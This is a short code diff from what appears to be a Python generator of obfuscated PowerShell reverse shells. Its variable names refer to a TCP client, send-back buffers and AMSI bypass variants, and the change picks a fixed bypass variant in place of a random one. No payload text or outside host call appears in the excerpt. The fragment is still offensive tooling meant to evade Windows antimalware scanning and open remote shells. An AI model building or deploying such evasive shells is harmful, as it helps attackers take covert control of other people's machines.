@@ -60,7 +60,7 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
         "amsi_type", "amsi_field", "amsi_failed", "tcpclient", "stream", "bytes", "i", "data", "sendback",
         "sendback2", "sendbyte"
     ]}
-    amsi_bypass = random.choice(amsi_bypass_variants(var))
+    amsi_bypass = amsi_bypass_variants(var)[0]
 
     # All variables used in the shell are assigned in var[]!
     core_shell = (
